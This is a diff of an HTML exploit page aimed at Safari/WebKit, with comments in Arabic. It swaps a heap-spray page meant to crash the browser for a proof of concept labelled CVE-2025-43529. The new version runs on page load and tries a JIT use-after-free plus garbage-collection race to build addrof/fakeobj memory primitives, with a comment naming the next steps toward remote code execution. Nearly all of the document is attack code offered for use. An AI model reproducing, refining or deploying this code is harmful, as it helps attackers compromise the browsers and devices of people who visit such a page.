@@ -1,136 +1,140 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2025-31273 — WebKit Memory Corruption</title>
-    <style>
-        body { background: #0a0a1a; color: #fff; font-family: monospace; padding: 20px; }
-        button { background: #c0392b; color: #fff; padding: 15px 30px; font-size: 18px; border: none; cursor: pointer; }
-        pre { background: #111; padding: 15px; border: 1px solid #333; min-height: 200px; margin: 20px 0; color: #00ff00; }
-    </style>
+<title>PoC CVE-2025-43529</title>
 </head>
 <body>
-    <h1>CVE-2025-31273 — Memory Corruption PoC</h1>
-    <p>يسبب تصدّع ذاكرة في WebKit. يعمل على Safari &lt; 18.6, iOS &lt; 18.6</p>
-    <pre id="log">[•] اضغط الزر لبدء الاستغلال...</pre>
-    <button id="runBtn">💥 تشغيل Memory Corruption</button>
+<script>
+// ====== إعدادات أساسية ======
+let A = { p0: 0x41414141 };
+let freed_object = null;
+let reclaimed_object = null;
+let ref = [];
 
-    <script>
-        const log = document.getElementById('log');
-        function out(msg) { log.innerHTML += msg + '\n'; log.scrollTop = log.scrollHeight; }
+// ====== Helper Functions ======
+function ftoi(f) {
+    let buf = new ArrayBuffer(8);
+    let fv = new Float64Array(buf);
+    let iv = new BigUint64Array(buf);
+    fv[0] = f;
+    return iv[0];
+}
 
-        document.getElementById('runBtn').onclick = async () => {
-            out('═══════════════════════════════');
-            out('▶ CVE-2025-31273 — بدء الهجوم');
-            out('═══════════════════════════════');
+function itof(i) {
+    let buf = new ArrayBuffer(8);
+    let fv = new Float64Array(buf);
+    let iv = new BigUint64Array(buf);
+    iv[0] = i;
+    return fv[0];
+}
 
-            // === المرحلة 1: Heap Spray ===
-            out('[1/3] تجهيز الذاكرة (Heap Spray)...');
-            let spray = [];
-            
-            // Float64Array spray
-            for (let i = 0; i < 10000; i++) {
-                let arr = new Float64Array(0x200);
-                for (let j = 0; j < arr.length; j++) {
-                    arr[j] = 13.37 + (i * 10000 + j) * 0.0000001;
-                }
-                spray.push(arr);
-            }
-            
-            // ArrayBuffer spray بأحجام حرجة
-            for (let size = 0x10; size <= 0x400; size += 0x10) {
-                for (let i = 0; i < 500; i++) {
-                    let buf = new ArrayBuffer(size);
-                    let view = new Uint8Array(buf);
-                    for (let j = 0; j < view.length; j++) {
-                        view[j] = 0x41 + (i % 26);
-                    }
-                    spray.push(buf);
-                }
-            }
-            out(`[✓] ${spray.length} كائن في الذاكرة`);
+// ====== JIT Function لتشغيل الـ UAF ======
+function jitme(flag) {
+    let a = { p0: 13.37 };
+    let b = { p0: 0x42424242, p1: null };
+    let f;
+    
+    if (flag) {
+        f = b;
+    } else {
+        f = 1.1;
+    }
+    
+    A.p0 = f;
+    b.p0 = a;
+    
+    if (flag) freed_object = a;
+}
 
-            // === المرحلة 2: إثارة Memory Corruption ===
-            out('[2/3] إثارة تصدّع الذاكرة...');
-            
-            // إنشاء آلاف الكائنات في حلقة — يسبب JIT confusion
-            let objects = [];
-            for (let round = 0; round < 20; round++) {
-                for (let i = 0; i < 500; i++) {
-                    try {
-                        let o = {
-                            a: 13.37,
-                            b: { c: [i, i+1, i+2] },
-                            d: new Uint8Array(0x100),
-                            e: function() { return i; },
-                            f: `string_${i}_${round}`
-                        };
-                        // إعادة كتابة خصائص باستمرار
-                        o.g = Math.random();
-                        o.h = o.b;
-                        delete o.g;
-                        objects.push(o);
-                    } catch(e) {}
-                }
-                
-                // إزالة نصف الكائنات — تحرير الذاكره بشكل غير آمن
-                if (objects.length > 2000) {
-                    objects.splice(0, 1000);
-                }
-            }
+// ====== تسخين JIT ======
+for (let i = 0; i < 20000; i++) {
+    jitme(true);
+    jitme(false);
+}
 
-            out(`[✓] ${objects.length} كائن في الذاكرة`);
+// ====== تشغيل Full GC لإطلاق السباق ======
+function triggerGC() {
+    let big = [];
+    for (let i = 0; i < 100000; i++) {
+        big.push({});
+    }
+}
 
-            // === المرحلة 3: استغلال Type Confusion ===
-            out('[3/3] استغلال Type Confusion...');
-            
-            // خلق تسابق بين JIT compilation و GC
-            function jitConfuse() {
-                let a = 13.37;
-                let b = 0x41414141;
-                let c = [a, b, a, b, a, b];
-                
-                // هذا الجزء يُجمّع بواسطة JIT
-                for (let i = 0; i < 1000; i++) {
-                    c[i % 6] = a + b;
-                    c[(i+1) % 6] = b - a;
-                }
-                
-                return c;
-            }
-            
-            // تشغيل الـ JIT + إجبار GC في نفس الوقت
-            for (let i = 0; i < 100; i++) {
-                try {
-                    jitConfuse();
-                    // إجبار Garbage Collection
-                    if (i % 10 === 0) {
-                        let big = new ArrayBuffer(1024 * 1024 * 100); // 100MB
-                        big = null;
-                    }
-                } catch(e) {
-                    out(`[!] خطأ في التكرار ${i}: ${e.message}`);
-                }
-            }
-            
-            out('');
-            out('═══════════════════════════════');
-            out('⚠️ إذا لم يتعطل Safari الآن،');
-            out('⚠️ حاول مرة أخرى أو أعد فتح الصفحة.');
-            out('═══════════════════════════════');
-            
-            // محاولة الوصول إلى ذاكرة محررة — يسبب crash
-            setTimeout(() => {
-                for (let i = 0; i < 10; i++) {
-                    try {
-                        objects[i].a = 13.37;
-                    } catch(e) {
-                        out(`✅ Safari crashed: ${e.message}`);
-                        return;
-                    }
-                }
-                out('❌ Safari لم يتعطل — هذا الإصدار قد يكون مُصحّحاً');
-            }, 500);
-        };
-    </script>
+// ====== عملية السباق (Race) ======
+// أولاً: تخزين قيمة كبيرة في stack لعرقلة GC
+function recursive(n) {
+    if (n === 0) return;
+    n = n | 0;
+    recursive(n - 1);
+}
+
+// ====== استعادة الذاكرة ======
+function reclaimButterfly() {
+    for (let i = 0; i < 1e6; ++i) {
+        let arr = [13.37, 2.2, 3.3, 4.4];
+        ref.push(arr);
+        if (freed_object && freed_object[0] === 13.37) {
+            reclaimed_object = freed_object;
+            return true;
+        }
+    }
+    return false;
+}
+
+// ====== Primitive بناء ======
+let boxed_arr, unboxed_arr;
+
+function buildPrimitives() {
+    boxed_arr = reclaimed_object;
+    boxed_arr[0] = {}; // Double -> Contiguous
+    unboxed_arr = freed_object;
+}
+
+function addrof(obj) {
+    boxed_arr[0] = obj;
+    return ftoi(unboxed_arr[0]);
+}
+
+function fakeobj(addr) {
+    unboxed_arr[0] = itof(addr);
+    return boxed_arr[0];
+}
+
+// ====== التنفيذ الرئيسي ======
+async function exploit() {
+    console.log("[*] Starting CVE-2025-43529 exploit...");
+    
+    // Trigger UAF
+    jitme(true);
+    
+    // تشغيل GC
+    triggerGC();
+    
+    // استدعاء recursive لمسح الـ stack
+    recursive(10000);
+    
+    // استعادة الـ butterfly
+    if (reclaimButterfly()) {
+        console.log("[+] Butterfly reclaimed!");
+        buildPrimitives();
+        
+        // اختبار الـ primitives
+        let test_obj = { x: 0x1337 };
+        let addr = addrof(test_obj);
+        console.log("[+] addrof test_obj = 0x" + addr.toString(16));
+        
+        // الآن يمكن بناء read/write primitives
+        console.log("[+] Exploit primitives ready!");
+        console.log("[*] Next: Build read64/write64 → PAC bypass → RCE");
+    } else {
+        console.log("[-] Failed to reclaim butterfly, retrying...");
+    }
+}
+
+// تشغيل الاستغلال عند تحميل الصفحة
+window.onload = function() {
+    exploit().catch(console.error);
+};
+</script>
 </body>
 </html>
